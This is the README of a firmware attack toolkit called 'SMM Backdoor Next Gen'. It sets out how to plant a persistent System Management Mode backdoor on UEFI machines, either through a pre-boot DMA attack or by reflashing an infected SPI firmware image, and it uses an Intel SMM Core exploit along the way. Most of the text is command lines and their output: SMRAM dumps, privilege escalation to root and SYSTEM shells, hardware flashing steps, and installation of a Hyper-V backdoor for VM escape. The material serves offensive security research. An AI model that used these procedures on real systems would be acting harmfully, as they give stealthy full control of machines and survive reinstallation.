
# SMM Backdoor Next Gen

[General information](#general-information)  
[Backdoor usage](#backdoor-usage)  
[Deploying the backdoor using firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection)  
[Using together with Hyper-V Backdoor](#using-together-with-hyper-v-backdoor)  

## General information

This version of System Management Mode backdoor for UEFI based platforms was heavily inspired by [my previous project](http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html) (check [its GitHub repository](https://github.com/Cr4sh/SmmBackdoor)) but introducing few key changes in order to make it more up to date:

 * In addition to the usual firmware flash image infection method as described in the article, new SMM backdoor also can be deployed with pre-boot DMA attack using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) (see [uefi_backdoor_simple.py](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) program usage for more details) and industry-wide EFI SMM Core [vulnerability exploitation](https://github.com/Cr4sh/SmmBackdoorNg/blob/main/src/exploit.c) to perform DXE to SMM execution transition. The vulnerability [INTEL-SA-00144](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00144.html) was discovered by myself and reported to Intel PSIRT [years ago](https://twitter.com/d_olex/status/877718172366798848), but it still remains not patched on many products that using old EDK2 derived firmware code, including whole [AMI Aptio](https://www.ami.com/aptio/) family. Latest generations of Intel machines are likely not vulnerable to this attack.

 * Client program `smm_backdoor.py` supports Windows and Linux systems and can interact with SMM backdoor using SW SMI (requires high privileges and [chipsec](https://github.com/chipsec/chipsec) installed) or APIC periodic timer method that can work with any privileges level.

 * There's `smm_backdoor_privesc_linux.py` and `smm_backdoor_privesc_win.py` test client programs for SMM backdoor that demonstrating local privileges escalation under Windows and Linux by using its API provided by `smm_backdoor.py` library.

 * SMM backdoor is fully virtualization-aware now, its library and client programs can work as expected inside Windows or Linux virtual machines running on the infected host system.

 * SMM backdoor also can be used to load [my Hyper-V backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv) (which is also part of PCI Express DIY hacking toolkit) into the currently running hypervisor during RT phase and perform guest to host VM escape attacks. Test client program `smm_backdoor_hyper_v.py` is used for integration with Hyper-V backdoor and its deployment.


## Backdoor usage

Project documentation is incomplete at this moment, but here's some command line examples.

Deploying SMM backdoor UEFI driver with PCI Express DIY hacking toolkit using pre-boot DMA attack, DXE to SMM execution transition exploit mentioned above will be started automatically once backdoor driver will be loaded:

```
# python2 uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi
[+] Using UEFI system table hook injection method
[+] Reading DXE phase payload from SmmBackdoorNg_X64.efi
[+] Waiting for PCI-E link...
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] Bad MRd TLP completion received
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Looking for DXE driver PE image...
[+] PE image is at 0x7a070000
[+] EFI_SYSTEM_TABLE is at 0x7a03e018
[+] EFI_BOOT_SERVICES is at 0x7a38fa30
[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4
Backdoor image size is 0x49a0
Backdoor entry RVA is 0x20fc
Planting DXE stage driver at 0xc0000...
Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c20fc
1.852231 sec.
[+] DXE driver was planted, waiting for backdoor init...
[+] DXE driver was executed
[+] DONE
```

In addition, you also can deploy the backdoor using [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection) described below in the next section.

Basic use of SMM backdoor `smm_backdoor.py` client program to display backdoor debug messages buffer once it was loaded and system has been booted:

```
# python2 smm_backdoor.py --debug
****** Chipsec Linux Kernel module is licensed under GPL 2.0
[+] Obtaining backdoor debug information...
[+] Debug output buffer physical address is 0x79da4000

00000001 - backdoor.c(1573) : ******************************
00000002 - backdoor.c(1574) :
00000003 - backdoor.c(1575) :   SMM backdoor loaded
00000004 - backdoor.c(1576) :
00000005 - backdoor.c(1577) : ******************************
00000006 - backdoor.c(1589) : Resident code base address is 0x79d9f000
00000007 - backdoor.c(1502) : BackdoorResidentDma()
00000008 - backdoor.c(313) : Protocol notify handler is at 0x79d9f364
00000009 - backdoor.c(1423) : SMM access 2 protocol is at 0x778fe650
00000010 - backdoor.c(1424) : Available SMRAM regions:
00000011 - backdoor.c(1434) :  * 0x7b000000:0x7b000fff
00000012 - backdoor.c(1434) :  * 0x7b001000:0x7b7fffff
00000013 - exploit.c(242) : SMM communicate header is at 0x79da2ae0
00000014 - exploit.c(256) : Executing SMM callback...
00000015 - backdoor.c(1215) : Running in SMM
00000016 - backdoor.c(1216) : SMM system table is at 0x7b7f84c0
00000017 - backdoor.c(1177) : Max. SW SMI value is 0xff
00000018 - backdoor.c(1188) : SW SMI handler is at 0x7b5effb8
00000019 - exploit.c(271) : Communicate(): status = 0xe, size = 0x19
00000020 - exploit.c(277) : Exploit(): Exploitation success
00000021 - backdoor.c(409) : SmmCtlHandle(): Periodic timer SW SMI was enabled
00000022 - backdoor.c(1328) : new_SetVirtualAddressMap()
00000023 - backdoor.c(1369) : New address of the resident image is 0xfffffffeec79f000
```

Check for responding backdoor and show basic information about System Management Mode execution environment:

```
# python2 smm_backdoor.py --use-timer --test
[+] Checking if SMM backdoor is present...
[+] Obtaining information...

  CR0 = 0x80000033
  CR3 = 0x7b7b1000
 SMST = 0x7b7f84c0

[+] SMRAM regions:

 * 0x7b000000:7b000fff
 * 0x7b001000:7b7fffff
```

Example of reading of arbitrary physical memory, beginning of SMRAM region in this case:

```
# python2 smm_backdoor.py --use-timer --read-phys 0x7b000000 --size 0x80
7b000000: 53 4d 4d 53 33 5f 36 34 90 c5 7d 7b 00 00 00 00 | SMMS3.64........
7b000010: 00 60 7a 7b 00 00 00 00 00 80 00 00 00 00 00 00 | ..z.............
7b000020: 33 00 00 80 00 00 00 00 00 10 7b 7b 00 00 00 00 | 3...............
7b000030: 68 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | h...............
7b000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
7b000050: 00 00 00 00 00 00 00 00 00 00 c0 84 7f 7b 00 00 | ................
7b000060: 00 00 e1 13 e0 12 e0 12 f0 12 e1 13 f1 03 f1 03 | ................
7b000070: f1 02 e1 13 e0 12 e0 12 e0 02 e1 13 f1 03 f1 03 | ................
```

To read and dump entire SMRAM regions into the file you can use the following command:

```
# python2 smm_backdoor.py --dump-smram
****** Chipsec Linux Kernel module is licensed under GPL 2.0
[+] Dumping SMRAM regions, this may take a while...
[+] Creating SMRAM_dump_7b000000_7b7fffff.bin
```

Example of `smm_backdoor_privesc_linux.py` client program usage for local privileges escalation under the Linux operating system:

```
$ python2 smm_backdoor_privesc_linux.py
[+] Initializing SMM backdoor client...
[+] User CR3 = 0x271b14000
[+] LSTAR = 0xffffffff81e00010
[+] do_syscall_64() is at 0xffffffff810025c0
[+] sys_call_table() is at 0xffffffff822001a0
[+] sys_getuid() is at 0xffffffff81073c10
[+] task_struct offset is 0x14d40
[+] cred offset is 0x628
[+] IA32_KERNEL_GS_BASE = 0xffff888277a00000
[+] Process task_struct is at 0xffff88827148db00
[+] Process cred is at 0xffff88827289d000
[+] Overwriting process credentials...
[+] Done, spawning root shell...

sh-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video)
```

Example of `smm_backdoor_privesc_win.py` client program usage for local privileges escalation under the Windows operating system:

```
PS C:\> python2 smm_backdoor_privesc_win.py
[+] Initializing SMM backdoor client...
[+] NT version is 10.0.19041
[+] _EPROCESS Token offset is 0x04b8
[+] _KPCR KernelDirectoryTableBase offset is 0x9000
[+] _KPCR structure is at 0xfffff8005f486000
[+] KVA shadow is disabled or not present
[+] Kernel CR3 value is 0x0000000141491000
[+] Token object address is 0xffffcd0ef752c060
[+] Present privileges: 0x1e73deff20 -> 0x1ff2ffffbc
[+] Enabled privileges: 0x60900000 -> 0x1ff2ffffbc
[+] Current process object address is 0xffffa60de954a080
[+] System process object address is 0xffffa60de12dd080
[+] Overwriting process token...
[+] Done, spawning SYSTEM shell...

Microsoft Windows [Version 10.0.19041.208]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\> whoami
nt authority\system
```

## Deploying the backdoor using firmware flash image infection

To infect platform firmware stored in the flash chip on the motherboard with SMM backdoor you will need some SPI flash programmer, I prefer to use cheap and widely available [FT2232H Mini Module](https://www.ftdichip.com/Support/Documents/DataSheets/Modules/DS_FT2232H_Mini_Module.pdf) from FTDI. Also, there's a [board called Tigrad](https://www.crowdsupply.com/securinghw/tigard) &minus; multi-protocol, multi-voltage tool for hardware hacking that can work as SPI flash programmer. In addition to the programmer you also will need the following tools:

 * [UEFITool](https://github.com/LongSoft/UEFITool/releases/tag/0.28.0) utility to parse and edit UEFI flash images
 * [Flashrom](https://github.com/flashrom/flashrom/releases/tag/v1.2) utility to work with SPI flash programmer
 * SOIC8 [test clip](https://www.sparkfun.com/products/13153) or [probe hook](https://www.sparkfun.com/products/9741) clips kit to connect programmer to the flash chip without its de-soldering

First of all, you have to disassemble the machine and locate SPI flash chip with platform firmware. Usually, it's [W25Q64](https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf) or [W25Q128](https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf) Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module. It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip. 

In case if you happen to find WSON8 packaged chip on you board instead of usual SOIC8 &minus; you can either de-solder it or use some sort of DIY [spring-loaded pogo pin](https://mouser.com/c/?q=pogo%20pin) test probe like this one to tap its pads:

<img src="https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/spi_probe.jpg" width="424">

Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:

<img src="https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/spi_wiring.png" width="542">

Now you can read flash chip contents using Flashrom:

```
> flashrom -p ft2232_spi:type=2232H,port=A –r firmware.bin
```

After that you need to open dumped firmware in UEFITool, locate arbitrary UEFI SMM driver to infect and extract its PE32 image section from the firmware image:

<img src="https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/uefi_tool.png" width="701">

For example, I picked `NvramSmm` UEFI SMM driver responsible for NVRAM access as pretty much suitable one. Then you can infect extracted driver with SMM backdoor using `--infect` command line option of `smm_backkdoor.py` program:

```
> python2 smm_backkdoor.py --infect NvramSmm.bin --output NvramSmm_infected.bin --payload SmmBackdoorNg_X64.efi
```

After that you have to replace original driver image with `NvramSmm_infected.bin` one in UEFITool, save resulting firmware image and flash it back into the chip:

```
> flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin
```

## Using together with Hyper-V Backdoor

Once you have SMM backdoor loaded, as it shown above, you can use its capabilities to load Hyper-V backdoor during runtime phase with appropriate client program running inside arbitrary guest or host Hyper-V partition. 

To do that you need to save `backdoor.bin` file [form Hyper-V backdoor repository](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor.bin) as `hyper_v_backdoor.bin` in the same folder with `smm_backdoor_hyper_v.py` test client program and then just run it:

```
PS C:\> python2 smm_backdoor_hyper_v.py
[+] Initializing SMM backdoor client...
[+] Searching for VMCS structure in physical memory, this might take a while...

 Scan step: 0x0000000001000000
 Scan from: 0x0000000100000000
   Scan to: 0x0000000200000000

[+] Hypervisor VMCS structure was found

 Physical address: 0x0000000109341000
         HOST_CR3: 0x0000000100103000
         HOST_RIP: 0xfffff87b6963236a

[+] HvlpLowMemoryStub() is at 0x0000000000002000
[+] Host operating system version is 2004
[+] VM exit handler is at 0xfffff87b6960e010
[+] VM exit handler call is at 0xfffff87b69632440
[+] 14 bytes jump is at 0xfffff87b69632466
[+] Backdoor entry is at 0x0000000000002700
[+] Backdoor code size is 860 bytes
[+] Patching VM exit handler call...
[+] Done, Hyper-V backdoor was successfully installed
```

In case when `smm_backdoor_hyper_v.py` is unable to locate target VMCS region &minus; you can override its default scanning options by specifying appropriate values in `--scan-from`, `--scan-to` and `--scan-step` command line arguments of the program. Since VMCS region location stage might take a while, you also can use `--verbose` option of the program to display operation progress information.

After successful Hyper-V backdoor load you can run [its client program](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_client) to ensure that backdoor is up and responding:

```
PS C:\> .\hyper_v_backdoor_client.exe 0
[+] Running on CPU #0
[+] Hyper-V backdoor is running

      Hypervisor CR0: 0x80010031
      Hypervisor CR3: 0x100103000
      Hypervisor CR4: 0x422e0
 Hypervisor IDT base: 0xfffff87b69a00180 (limit = 0xffff)
  Hypervisor GS base: 0xfffff87b69ba6000
        VMCS address: 0x109341000
     VM exit handler: 0xfffff87b6960e010
       VM exit count: 0x86ed
       VM call count: 0x2518
```

For more information about Hyper-V backdoor client program and performing guest to host VM escape attacks on Windows targets you can [check usage examples](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv#vm-escape-related-commands) in Hyper-V backdoor documentation. 


## About

Developed by:<br />
Dmytro Oleksiuk (aka Cr4sh)

[cr4sh0@gmail.com](mailto:cr4sh0@gmail.com)<br />
[http://blog.cr4.sh](http://blog.cr4.sh)
